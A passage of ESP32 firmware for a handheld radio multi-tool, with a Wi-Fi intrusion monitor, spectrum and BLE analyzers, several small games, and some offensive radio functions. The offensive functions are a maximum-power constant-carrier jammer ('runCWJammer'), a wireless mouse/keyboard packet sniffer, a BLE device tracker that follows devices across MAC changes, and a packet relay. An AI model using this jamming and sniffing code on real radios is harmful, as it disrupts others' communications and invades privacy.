  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wids_promiscuous_cb);
  beaconCount = 0;
  deauthCount = 0;
  floodAlert = false;
  evilTwinAlert = false;
  knownAPCount = 0;
  unsigned long lastCheck = millis();
  const int BEACON_THRESHOLD = 50;
  const int DEAUTH_THRESHOLD = 15;
  displayInfo("WIDS Active", "SEL to exit");
  while (!selPressed()) {
    if (millis() - lastCheck >= 1000) {
      if (beaconCount > BEACON_THRESHOLD)
        floodAlert = true;
      else
        floodAlert = false;
      display.clearDisplay();
      drawStatusBar();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 10);
      display.print("WIDS Monitor");
      display.setCursor(0, 22);
      display.print("B:");
      display.print(beaconCount);
      display.print(" D:");
      display.print(deauthCount);
      if (floodAlert || evilTwinAlert || deauthCount > DEAUTH_THRESHOLD) {
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.setCursor(0, 40);
        if (floodAlert)
          display.print("FLOOD!");
        else if (evilTwinAlert) {
          display.print("EVIL TWIN: ");
          display.print(evilTwinSSID);
        } else if (deauthCount > DEAUTH_THRESHOLD)
          display.print("DEAUTH ATTACK");
      } else {
        display.setCursor(0, 40);
        display.print("Normal");
      }
      display.display();
      beaconCount = 0;
      deauthCount = 0;
      evilTwinAlert = false;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// RF ANALYZER (çift radyo, 128x64)
// ==========================================
void runRFAnalyzer() {
  initRadios();
  if (radio2Active) {
    radio2.stopConstCarrier();
    radio2.setAutoAck(false);
    radio2.startListening();
    radio2.setChannel(45);
  }
  const int w = 128, h = 40;
  uint8_t waterfall[128 * (h / 8 + 1)] = {0};
  bool exitFlag = false;
  displayInfo("RF Analyzer", "Dual Radio", "SEL to exit");
  while (!exitFlag) {
    if (selPressed())
      exitFlag = true;
    for (int y = 0; y < h - 1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y + 1) * (w / 8) + x / 8] >> (x % 8)) & 1;
        if (bit)
          waterfall[y * (w / 8) + x / 8] |= (1 << (x % 8));
        else
          waterfall[y * (w / 8) + x / 8] &= ~(1 << (x % 8));
      }
    }
    for (int x = 0; x < w; x++)
      waterfall[(h - 1) * (w / 8) + x / 8] &= ~(1 << (x % 8));
    for (int ch = 0; ch < 80; ch++) {
      if (radio1Active)
        radio.setChannel(ch);
      delayMicroseconds(120);
      if (radio1Active && radio.testRPD()) {
        int x = map(ch, 0, 79, 0, w - 1);
        waterfall[(h - 1) * (w / 8) + x / 8] |= (1 << (x % 8));
      }
      yield();
    }
    float noiseSum = 0;
    for (int i = 0; i < 50; i++) {
      if (radio2Active && radio2.testRPD())
        noiseSum += 1;
      delayMicroseconds(50);
    }
    float noiseFloor = noiseSum / 50.0;
    display.clearDisplay();
    drawStatusBar();
    display.drawBitmap(0, 10, waterfall, w, h, SSD1306_WHITE);
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, h + 12);
    display.print("2.40 N:");
    display.print(noiseFloor, 1);
    display.setCursor(100, h + 12);
    display.print("2.48");
    display.display();
    safeDelay(20);
  }
  stopRadios();
  initRadios();
}

// ==========================================
// BLE GATT EXPLORER
// ==========================================
static BLEAdvertisedDevice *gattDevice = nullptr;
static BLEClient *pClient = nullptr;

void runBLEGATTExplorer() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  gattDevice = nullptr;
  displayInfo("BLE GATT", "Scanning...");
  pScan->start(5, false);
  while (gattDevice == nullptr && !selPressed()) {
    if (scanCount > 0)
      gattDevice = scannedDevices[0];
    yield();
  }
  pScan->stop();
  if (gattDevice != nullptr) {
    displayInfo("Connecting", gattDevice->getName().c_str());
    pClient = BLEDevice::createClient();
    if (pClient->connect(gattDevice)) {
      displayInfo("Connected", "Getting services...");
      std::map<std::string, BLERemoteService *> *services =
          pClient->getServices();
      int idx = 0;
      while (!selPressed()) {
        display.clearDisplay();
        drawStatusBar();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 10);
        display.print("Services:");
        int y = 22;
        int count = 0;
        for (auto &svc : *services) {
          if (count == idx) {
            display.fillRect(0, y - 1, 128, 10, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
          } else
            display.setTextColor(SSD1306_WHITE);
          display.setCursor(2, y);
          display.print(String(svc.first.c_str()));
          y += 10;
          if (++count > 4)
            break;
        }
        display.display();
        if (upPressed())
          idx = max(0, idx - 1);
        if (downPressed())
          idx = min((int)services->size() - 1, idx + 1);
        yield();
      }
      pClient->disconnect();
    } else {
      displayInfo("Connect failed", "SEL to return");
      while (!selPressed())
        yield();
    }
  } else {
    displayInfo("No BLE device", "SEL to return");
    while (!selPressed())
      yield();
  }
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// BLE TRACKER
// ==========================================
struct DeviceFingerprint {
  String name;
  int companyId;
  uint8_t payload[30];
  int payloadLen;
  unsigned long lastSeen;
  String lastMac;
};
std::vector<DeviceFingerprint> fingerprints;

void analyzeAdvertisement(BLEAdvertisedDevice dev) {
  String name = dev.haveName() ? dev.getName() : "";
  int manufacturerId = -1;
  String mdataStr = dev.haveManufacturerData() ? dev.getManufacturerData() : "";
  std::string mdata = std::string(mdataStr.c_str());
  if (mdata.length() >= 2)
    manufacturerId = mdata[0] | (mdata[1] << 8);
  for (auto &fp : fingerprints) {
    if (fp.companyId == manufacturerId && fp.name == name) {
      fp.lastSeen = millis();
      fp.lastMac = dev.getAddress().toString().c_str();
      return;
    }
  }
  DeviceFingerprint newFp;
  newFp.name = name;
  newFp.companyId = manufacturerId;
  newFp.lastSeen = millis();
  newFp.lastMac = dev.getAddress().toString().c_str();
  if (mdata.length() > 0 && mdata.length() <= 30) {
    memcpy(newFp.payload, mdata.c_str(), mdata.length());
    newFp.payloadLen = mdata.length();
  } else
    newFp.payloadLen = 0;
  fingerprints.push_back(newFp);
}

class TrackerCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) { analyzeAdvertisement(dev); }
};

void runBLETracker() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan *pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new TrackerCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  fingerprints.clear();
  displayInfo("BLE Tracker", "Scanning...", "SEL to exit");
  pScan->start(0, nullptr, true);
  while (!selPressed()) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Devices:");
    int y = 24;
    for (int i = 0; i < min(5, (int)fingerprints.size()); i++) {
      String info = fingerprints[i].name + " (" +
                    String(fingerprints[i].companyId, HEX) + ")";
      display.setCursor(0, y);
      display.print(info);
      y += 10;
    }
    display.display();
    safeDelay(1000);
  }
  pScan->stop();
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// MOUSE/KLAVYE SNIFFER
// ==========================================
void runMouseSniffer() {
  if (!radio1Active) {
    displayInfo("Radio1 needed");
    safeDelay(2000);
    return;
  }
  stopRadios();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);
  const uint8_t addr[5] = {0x12, 0x34, 0x56, 0x78, 0x9A};
  for (int i = 0; i < 6; i++)
    radio.openReadingPipe(i, addr);
  radio.startListening();
  displayInfo("Mouse Sniffer", "Listening...", "SEL to exit");
  uint8_t packet[32];
  int16_t mouseX = 64, mouseY = 32;
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&packet, len);
      if (len >= 4) {
        mouseX = constrain(mouseX + (int8_t)packet[1], 0, 127);
        mouseY = constrain(mouseY - (int8_t)packet[2], 0, 63);
      }
      display.clearDisplay();
      display.drawPixel(mouseX, mouseY, SSD1306_WHITE);
      display.drawRect(mouseX - 2, mouseY - 2, 4, 4, SSD1306_WHITE);
      display.display();
    }
    yield();
  }
  radio.stopListening();
  initRadios();
}

// ==========================================
// RF REPEATER
// ==========================================
void runRFRepeater() {
  if (!radio1Active || !radio2Active) {
    displayInfo("Both radios needed");
    safeDelay(2000);
    return;
  }
  stopRadios();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setAddressWidth(5);
  radio.openReadingPipe(0, 0xE7E7E7E7E7LL);
  radio.startListening();
  radio2.setAutoAck(false);
  radio2.setDataRate(RF24_2MBPS);
  radio2.setCRCLength(RF24_CRC_DISABLED);
  radio2.setAddressWidth(5);
  radio2.openWritingPipe(0xE7E7E7E7E7LL);
  radio2.stopListening();
  displayInfo("RF Repeater", "Relay active", "SEL to stop");
  uint8_t buf[32];
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&buf, len);
      radio2.writeFast(&buf, len);
    }
    yield();
  }
  initRadios();
}

// ==========================================
// RF OSİLOSKOP (128x64)
// ==========================================
// ==========================================
// RF OSİLOSKOP (128x64 ULTRA LUXE GRID)
// ==========================================
void runRFOscilloscope() {
  if (!radio2Active) {
    displayInfo("Radio2 needed");
    safeDelay(2000);
    return;
  }
  stopRadios();
  radio2.setAutoAck(false);
  radio2.startListening();
  int channel = 45, timeScale = 1;
  const int w = 128;
  uint8_t waveform[w];
  memset(waveform, 0, w);
  int sampleIdx = 0;
  int peakVal = 0;
  
  displayInfo("RF Oscilloscope", "Ch:" + String(channel), "UP:ch DN:scale SEL:exit");
  safeDelay(500);

  while (!selPressed()) {
    if (upPressed()) {
      channel = (channel + 1) % 126;
      radio2.setChannel(channel);
      peakVal = 0;
    }
    if (downPressed()) {
      timeScale = (timeScale % 3) + 1;
    }
    radio2.setChannel(channel);
    delayMicroseconds(timeScale * 100);
    int rpd = 0;
    for (int i = 0; i < 5; i++) {
      if (radio2.testRPD())
        rpd++;
      delayMicroseconds(20);
    }
    if (rpd > peakVal) peakVal = rpd;

    waveform[sampleIdx] = map(rpd, 0, 5, 0, 50);
    sampleIdx = (sampleIdx + 1) % w;

    display.clearDisplay();

    // Draw Scope Grid (Izgara Çizgileri)
    for (int y = 14; y < 64; y += 12) {
      for (int x = 0; x < 128; x += 8) {
        display.drawPixel(x, y, SSD1306_WHITE);
      }
    }
    for (int x = 16; x < 128; x += 32) {
      for (int y = 14; y < 64; y += 4) {
        display.drawPixel(x, y, SSD1306_WHITE);
      }
    }

    // Draw Waveform
    for (int x = 0; x < w - 1; x++) {
      int y1 = 63 - waveform[(sampleIdx + x) % w];
      int y2 = 63 - waveform[(sampleIdx + x + 1) % w];
      display.drawLine(x, y1, x + 1, y2, SSD1306_WHITE);
    }

    // Header Info
    display.fillRect(0, 0, 128, 11, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setTextSize(1);
    display.setCursor(2, 2);
    display.print("SCOPE Ch:");
    display.print(channel);
    display.setCursor(75, 2);
    display.print(timeScale);
    display.print("X Pk:");
    display.print(peakVal);

    display.display();
    yield();
  }
  radio2.stopListening();
  initRadios();
}

// ==========================================
// DOOM 3D (MONSTER SHOOTER RAYCASTER)
// ==========================================
void runDOOM() {
  float playerX = 3.5, playerY = 3.5;
  float playerA = 0.0;
  float monsterX = 6.5, monsterY = 6.5;
  bool monsterAlive = true;
  int hp = 100;
  int score = 0;

  const int MAP_W = 8;
  const int MAP_H = 8;
  const char mapData[] = 
    "########"
    "#......#"
    "#..##..#"
    "#......#"
    "#......#"
    "#..##..#"
    "#......#"
    "########";

  displayInfo("DOOM 3D", "Monsters & Guns", "UP:FWD DN:TRN SEL:SHT");
  safeDelay(1200);

  while (!selPressed() && hp > 0) {
    if (checkEscapeToMenu()) return;

    if (upPressed()) {
      float newX = playerX + cos(playerA) * 0.3;
      float newY = playerY + sin(playerA) * 0.3;
      if (mapData[(int)newY * MAP_W + (int)newX] != '#') {
        playerX = newX;
        playerY = newY;
      }
    }
    if (downPressed()) {
      playerA += 0.25;
      if (playerA > 6.28) playerA -= 6.28;
    }

    // Monster AI - Move toward player
    if (monsterAlive) {
      float dx = playerX - monsterX;
      float dy = playerY - monsterY;
      float dist = sqrt(dx*dx + dy*dy);
      if (dist > 0.6) {
        monsterX += (dx / dist) * 0.08;
        monsterY += (dy / dist) * 0.08;
      } else {
        hp -= 5; // Monster attack
      }
    } else {
      // Respawn monster
      monsterX = 1.5 + random(5);
      monsterY = 1.5 + random(5);
      monsterAlive = true;
    }

    display.clearDisplay();

    // Raycasting rendering
    const float FOV = 1.0;
    const int RAYS = 64;
    for (int r = 0; r < RAYS; r++) {
      float rayAngle = (playerA - FOV / 2.0) + ((float)r / (float)RAYS) * FOV;
      float distanceToWall = 0.0;
      bool hitWall = false;

      float eyeX = cos(rayAngle);
      float eyeY = sin(rayAngle);

      while (!hitWall && distanceToWall < 12.0) {
        distanceToWall += 0.15;
        int checkX = (int)(playerX + eyeX * distanceToWall);
        int checkY = (int)(playerY + eyeY * distanceToWall);

        if (checkX < 0 || checkX >= MAP_W || checkY < 0 || checkY >= MAP_H) {
          hitWall = true;
          distanceToWall = 12.0;
        } else if (mapData[checkY * MAP_W + checkX] == '#') {
          hitWall = true;
        }
      }

      int ceiling = (float)(32 - 32 / distanceToWall);
      int floor = 64 - ceiling;
      int wallHeight = floor - ceiling;

      display.drawFastVLine(r * 2, ceiling, wallHeight, SSD1306_WHITE);
      display.drawFastVLine(r * 2 + 1, ceiling, wallHeight, SSD1306_WHITE);
    }

    // Draw Monster if visible
    float mDx = monsterX - playerX;
    float mDy = monsterY - playerY;
    float mDist = sqrt(mDx*mDx + mDy*mDy);
    float mAngle = atan2(mDy, mDx) - playerA;

    while (mAngle < -3.14) mAngle += 6.28;
    while (mAngle > 3.14) mAngle -= 6.28;

    if (monsterAlive && fabs(mAngle) < FOV / 2.0 && mDist > 0.5) {
      int mScreenX = (64) + tan(mAngle) * 64;
      int mSize = min(30, (int)(32 / mDist));
      int mY = 32 - mSize / 2;

      // Monster sprite (Imp/Demon)
      display.fillRect(mScreenX - mSize/2, mY, mSize, mSize, SSD1306_WHITE);
      display.fillRect(mScreenX - mSize/4, mY + mSize/4, mSize/2, mSize/4, SSD1306_BLACK); // Eyes
    }

    // Gun Sight Crosshair & Gun Frame
    display.fillRect(60, 48, 8, 16, SSD1306_WHITE);
    display.fillRect(62, 44, 4, 4, SSD1306_WHITE);

    // Shooting Action
    if (selPressed()) {
      display.fillRect(58, 40, 12, 6, SSD1306_WHITE); // Muzzle flash
      if (monsterAlive && fabs(mAngle) < 0.25 && mDist < 6.0) {
        monsterAlive = false;
        score += 100;
      }
    }

    // HUD Status
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print("HP:"); display.print(hp);
    display.setCursor(75, 0);
    display.print("KILL:"); display.print(score);

    display.display();
    safeDelay(20);
    yield();
  }
}

// ==========================================
// ==========================================
// CHROME T-REX DINO RUNNER (JUMP & DUCK)
// ==========================================
void runDinoGame() {
  float dinoY = 42.0;
  float dinoVY = 0.0;
  bool isJumping = false;
  bool isDucking = false;

  float obstacleX = 128.0;
  int obstacleType = 0; // 0 = Cactus, 1 = Pterodactyl
  float obstacleSpeed = 3.5;

  int score = 0;

  displayInfo("Dino Runner", "UP:Jump DN:Duck", "SEL:exit");
  safeDelay(1200);

  while (!selPressed()) {
    if (checkEscapeToMenu()) return;

    // Controls
    if (upPressed() && !isJumping) {
      dinoVY = -5.5; // Jump
      isJumping = true;
    }
    isDucking = (digitalRead(DOWN_BUTTON_PIN) == LOW);

    // Physics
    if (isJumping) {
      dinoY += dinoVY;
      dinoVY += 0.45; // Gravity
      if (dinoY >= 42.0) {
        dinoY = 42.0;
        dinoVY = 0.0;
        isJumping = false;
      }
    }

    // Move Obstacle
    obstacleX -= obstacleSpeed;
    if (obstacleX < -15) {
      obstacleX = 128.0 + random(10, 40);
      obstacleType = random(2);
      obstacleSpeed = min(6.5f, obstacleSpeed + 0.1f);
      score += 10;
    }

    // Hitbox & Collision Detection
    // Standing Dino: Y=42, H=16 (covers 42..58)
    // Ducking Dino:  Y=51, H=7  (covers 51..58)
    int dinoH = isDucking ? 7 : 16;
    int dinoBoxY = isDucking ? 51 : (int)dinoY;

    int obsW = (obstacleType == 0) ? 8 : 12;
    int obsH = (obstacleType == 0) ? 14 : 8;
    // Cactus at ground level Y=44; Pterodactyl flies at head-height Y=40
    int obsY = (obstacleType == 0) ? 44 : 40;

    if (obstacleX < 20 && (obstacleX + obsW) > 10) {
      if (dinoBoxY + dinoH > obsY && dinoBoxY < obsY + obsH) {
        // Crash / Game Over
        display.fillRect(16, 20, 96, 24, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setTextSize(1);
        display.setCursor(24, 28);
        display.print("GAME OVER!");
        display.setCursor(24, 38);
        display.print("Score: " + String(score));
        display.display();
        safeDelay(2000);
        break;
      }
    }

    display.clearDisplay();

    // Ground Line
    display.drawFastHLine(0, 58, 128, SSD1306_WHITE);

    // Render Dino Character Sprite
    if (isDucking) {
      // Ducking Dino (Low Profile)
      display.fillRect(10, 51, 16, 7, SSD1306_WHITE);
      display.drawPixel(24, 53, SSD1306_BLACK); // Eye
    } else {
      // Standing/Running Dino
      display.fillRect(10, (int)dinoY, 10, 16, SSD1306_WHITE);
      display.fillRect(14, (int)dinoY, 6, 6, SSD1306_WHITE); // Head
      display.drawPixel(18, (int)dinoY + 2, SSD1306_BLACK); // Eye
      // Running legs animation
      if ((millis() / 100) % 2 == 0) {
        display.drawFastVLine(12, (int)dinoY + 16, 3, SSD1306_WHITE);
      } else {
        display.drawFastVLine(16, (int)dinoY + 16, 3, SSD1306_WHITE);
      }
    }

    // Render Obstacle (Cactus or Pterodactyl)
    if (obstacleType == 0) {
      // Cactus
      display.fillRect((int)obstacleX, 44, 8, 14, SSD1306_WHITE);
      display.fillRect((int)obstacleX - 2, 48, 3, 4, SSD1306_WHITE);
      display.fillRect((int)obstacleX + 7, 46, 3, 4, SSD1306_WHITE);
    } else {
      // Flying Pterodactyl at head height
      display.fillRect((int)obstacleX, 40, 12, 6, SSD1306_WHITE);
      display.fillRect((int)obstacleX + 3, (millis()/150)%2 == 0 ? 36 : 44, 6, 4, SSD1306_WHITE); // Flapping Wings
    }

    // Score Banner
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(80, 0);
    display.print("HI:");
    display.print(score);

    display.display();
    safeDelay(25);
    yield();
  }
}

// ==========================================
// FLAPPY BIRD GAME (PHYSICS & PIPES)
// ==========================================
void runFlappyBird() {
  float birdY = 30.0;
  float birdVY = 0.0;
  float pipeX = 128.0;
  int pipeGapY = 18;
  const int pipeGapSize = 28; // Wider gap for smooth passing
  int score = 0;

  displayInfo("Flappy Bird", "UP/SEL: Flap", "Avoid Pipes!");
  safeDelay(1200);

  while (!selPressed()) {
    if (checkEscapeToMenu()) return;

    // Controls
    if (upPressed() || selPressed()) {
      birdVY = -3.2; // Flap Wing Jump
    }

    // Physics
    birdVY += 0.32; // Gravity
    birdY += birdVY;

    // Move Pipe
    pipeX -= 2.5;
    if (pipeX < -16) {
      pipeX = 128.0;
      pipeGapY = random(10, 28);
      score++;
    }

    // Collision Check (Smaller bird size: 6x5)
    bool hitGround = (birdY <= 0 || birdY >= 58);
    bool hitPipe = (pipeX < 20 && pipeX > 4) && 
                   (birdY < pipeGapY || (birdY + 5) > (pipeGapY + pipeGapSize));

    if (hitGround || hitPipe) {
      display.fillRect(16, 20, 96, 24, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setTextSize(1);
      display.setCursor(24, 28);
      display.print("CRASHED!");
      display.setCursor(24, 38);
      display.print("Score: " + String(score));
      display.display();
      safeDelay(2000);
      break;
    }

    display.clearDisplay();

    // Render Compact Bird Sprite (6x5)
    display.fillRect(10, (int)birdY, 6, 5, SSD1306_WHITE);
    display.fillRect(16, (int)birdY + 1, 3, 2, SSD1306_WHITE); // Beak
    display.drawPixel(14, (int)birdY + 1, SSD1306_BLACK); // Eye
    if (birdVY < 0) {
      display.fillRect(7, (int)birdY + 3, 3, 2, SSD1306_WHITE); // Wing up
    } else {
      display.fillRect(7, (int)birdY, 3, 2, SSD1306_WHITE); // Wing down
    }

    // Render Top & Bottom Pipes (Gap = 28px)
    display.fillRect((int)pipeX, 0, 14, pipeGapY, SSD1306_WHITE); // Top Pipe
    display.fillRect((int)pipeX - 1, pipeGapY - 3, 16, 3, SSD1306_WHITE); // Cap

    display.fillRect((int)pipeX, pipeGapY + pipeGapSize, 14, 64 - (pipeGapY + pipeGapSize), SSD1306_WHITE); // Bottom Pipe
    display.fillRect((int)pipeX - 1, pipeGapY + pipeGapSize, 16, 3, SSD1306_WHITE); // Cap

    // Score Banner
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(55, 2);
    display.print(score);

    display.display();
    safeDelay(30);
    yield();
  }
}

// ==========================================
// CW JAMMER
// ==========================================
void runCWJammer() {
  initRadios();
  int freq = 45;
  displayInfo("CW Jammer", "Ch:" + String(freq), "UP/DN chg SEL exit");
  if (radio1Active)
    radio.startConstCarrier(RF24_PA_MAX, freq);
  if (radio2Active)
    radio2.startConstCarrier(RF24_PA_MAX, freq);
  while (!selPressed()) {
    if (upPressed()) {
      freq = min(125, freq + 1);
      if (radio1Active)
        radio.setChannel(freq);
      if (radio2Active)
        radio2.setChannel(freq);
    }
    if (downPressed()) {
      freq = max(0, freq - 1);
      if (radio1Active)
        radio.setChannel(freq);
      if (radio2Active)
        radio2.setChannel(freq);
    }
    displayInfo("CW Jammer", "Ch:" + String(freq), "UP/DN chg SEL exit");
    safeDelay(200);
    yield();
  }
  stopRadios();
}

// ==========================================
// TICTACTOE (ULTRA LUXE VS AI BOT)
// ==========================================
void runTicTacToe() {
  char board[9] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '};
  int cursor = 0;
  char player = 'X';
  int moves = 0;
  
  const int wins[8][3] = {{0, 1, 2}, {3, 4, 5}, {6, 7, 8}, {0, 3, 6},
                          {1, 4, 7}, {2, 5, 8}, {0, 4, 8}, {2, 4, 6}};

  auto checkWin = [&]() -> char {
    for (auto &w : wins)
      if (board[w[0]] != ' ' && board[w[0]] == board[w[1]] && board[w[1]] == board[w[2]])
        return board[w[0]];
    return ' ';
  };

  auto aiMove = [&]() {
    // 1. Check if AI can win
    for (int i = 0; i < 9; i++) {
      if (board[i] == ' ') {
        board[i] = 'O';
        if (checkWin() == 'O') return;
        board[i] = ' ';
      }
    }
    // 2. Check if AI needs to block Player X
    for (int i = 0; i < 9; i++) {
      if (board[i] == ' ') {
        board[i] = 'X';
        if (checkWin() == 'X') {
          board[i] = 'O';
          return;
        }
        board[i] = ' ';
      }
    }
    // 3. Take Center
    if (board[4] == ' ') { board[4] = 'O'; return; }
    // 4. Take Corners
    int corners[] = {0, 2, 6, 8};
    for (int c : corners) {
      if (board[c] == ' ') { board[c] = 'O'; return; }
    }
    // 5. Take any empty spot
    for (int i = 0; i < 9; i++) {
      if (board[i] == ' ') { board[i] = 'O'; return; }
    }
  };

  displayInfo("TicTacToe AI", "You: X | Bot: O", "UP/DN:move SEL:set");
  safeDelay(1200);

  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(2);
    display.setTextColor(SSD1306_WHITE);
    display.drawLine(42, 0, 42, 48, SSD1306_WHITE);
    display.drawLine(85, 0, 85, 48, SSD1306_WHITE);
    display.drawLine(0, 16, 128, 16, SSD1306_WHITE);
    display.drawLine(0, 32, 128, 32, SSD1306_WHITE);

    for (int i = 0; i < 9; i++) {
      int x = (i % 3) * 43 + 14;
      int y = (i / 3) * 16 + 1;
      if (i == cursor) {
        display.fillRect((i % 3) * 43 + 2, (i / 3) * 16 + 1, 38, 14, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(x, y);
      display.print(board[i] == ' ' ? "-" : String(board[i]));
    }

    char winner = checkWin();
    if (winner != ' ' || moves == 9) {
      display.fillRect(0, 49, 128, 15, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setTextSize(1);
      display.setCursor(15, 53);
      if (winner == 'X') display.print("YOU WON AGAINST BOT!");
      else if (winner == 'O') display.print("BOT (AI) WINS!");
      else display.print("DRAW GAME!");
      display.display();
      safeDelay(2500);
      break;
    }
    display.display();

    if (player == 'X') {
      if (upPressed())
        cursor = (cursor + 9 - 1) % 9;
      if (downPressed())
        cursor = (cursor + 1) % 9;
      if (selPressed()) {
        if (board[cursor] == ' ') {
          board[cursor] = 'X';
          moves++;
          if (checkWin() == ' ' && moves < 9) {
            aiMove();
            moves++;
          }
        }
      }
    }
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// PONG (128x64)
// ==========================================
// ==========================================
// PONG (ULTRA LUXE MATCH MODE)
// ==========================================
void runPong() {
  int paddleLeft = 24, paddleRight = 24;
  float ballX = 64, ballY = 32, ballDX = 2.5, ballDY = 1.5;
  int scoreL = 0, scoreR = 0;
  displayInfo("PONG MATCH", "First to 5 Wins", "UP/DN:move SEL:exit");
  safeDelay(1200);

  while (!selPressed()) {
    if (upPressed())
      paddleLeft = max(0, paddleLeft - 4);
    if (downPressed())
      paddleLeft = min(48, paddleLeft + 4);

    ballX += ballDX;
    ballY += ballDY;

    if (ballY <= 2 || ballY >= 61)
      ballDY = -ballDY;

    // Paddle Left Collision
    if (ballX <= 5 && ballY >= paddleLeft && ballY <= paddleLeft + 16) {
      ballDX = fabs(ballDX) + 0.1;
      ballDY += (ballY - (paddleLeft + 8)) * 0.15;
    }
    // Paddle Right Collision (AI)
    if (ballX >= 122 && ballY >= paddleRight && ballY <= paddleRight + 16) {
      ballDX = -fabs(ballDX) - 0.1;
      ballDY += (ballY - (paddleRight + 8)) * 0.15;
    }

    if (ballX < 0) {
      scoreR++;
      ballX = 64; ballY = 32;
      ballDX = 2.5; ballDY = 1.5;
    }
    if (ballX > 128) {
      scoreL++;
      ballX = 64; ballY = 32;
      ballDX = -2.5; ballDY = 1.5;
    }

    // Smart AI Paddle
    if (ballY < paddleRight + 6)
      paddleRight = max(0, paddleRight - 2);
    else if (ballY > paddleRight + 10)
      paddleRight = min(48, paddleRight + 2);

    display.clearDisplay();

    // Dotted Court Line
    for (int y = 0; y < 64; y += 6) {
      display.drawFastVLine(64, y, 3, SSD1306_WHITE);
    }

    // Paddles & Ball
    display.fillRect(2, paddleLeft, 3, 16, SSD1306_WHITE);
    display.fillRect(123, paddleRight, 3, 16, SSD1306_WHITE);
    display.fillRect(ballX - 1, ballY - 1, 3, 3, SSD1306_WHITE);

    // Score Banner
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(45, 2);
    display.print(scoreL);
    display.setCursor(78, 2);
    display.print(scoreR);

    // Check Match Winner (First to 5)
    if (scoreL >= 5 || scoreR >= 5) {
      display.fillRect(16, 20, 96, 24, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(24, 28);
      display.print(scoreL >= 5 ? "YOU WIN MATCH!" : "BOT WINS MATCH!");
      display.display();
      safeDelay(2500);
      break;
    }

    display.display();
    safeDelay(15);
    yield();
  }
  currentState = STATE_MENU;
  drawMainMenu();
}

// ==========================================
// YENİ OYUN: HUNT THE WUMPUS
// ==========================================
void runHuntGame() {
  int rooms[20] = {0};
  int wumpus = random(20);
  int bat1 = random(20), bat2 = random(20);
  while (bat1 == wumpus)
    bat1 = random(20);
  while (bat2 == wumpus || bat2 == bat1)
    bat2 = random(20);
  int pit1 = random(20), pit2 = random(20);
  while (pit1 == wumpus || pit1 == bat1 || pit1 == bat2)
    pit1 = random(20);
  while (pit2 == wumpus || pit2 == bat1 || pit2 == bat2 || pit2 == pit1)
    pit2 = random(20);
  int player = random(20);
  int arrows = 3;
  displayInfo("Hunt Wumpus", "Arrows:3");
  safeDelay(1000);
  while (true) {
    display.clearDisplay();
    drawStatusBar();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 10);
    display.print("Room: ");
    display.print(player);
    String msg = "";
    if (abs(player - wumpus) <= 2)
      msg += "Smell! ";
    if (abs(player - bat1) <= 2 || abs(player - bat2) <= 2)
      msg += "Bats! ";
    if (abs(player - pit1) <= 2 || abs(player - pit2) <= 2)
      msg += "Wind! ";
    display.setCursor(0, 22);
    display.print(msg);
    display.setCursor(0, 34);
    display.print("UP:move DN:shoot");
    display.display();
    while (!upPressed() && !downPressed() && !selPressed())
      yield();
    if (upPressed()) {
      player = random(20);
    }
    if (downPressed()) {
      if (arrows > 0) {
        arrows--;
        int shot = player;
        while (shot == player)
          shot = random(20);
        if (shot == wumpus) {
          displayInfo("You killed Wumpus!", "WIN");
          safeDelay(2000);
          break;
        } else if (shot == bat1 || shot == bat2) {
          displayInfo("Bat moved!");
          safeDelay(1000);
          bat1 = random(20);
        } else if (shot == pit1 || shot == pit2) {
          displayInfo("Pit!");
          safeDelay(1000);
        } else {
          displayInfo("Missed!");
          safeDelay(1000);
        }
      }
    }
    if (player == wumpus) {
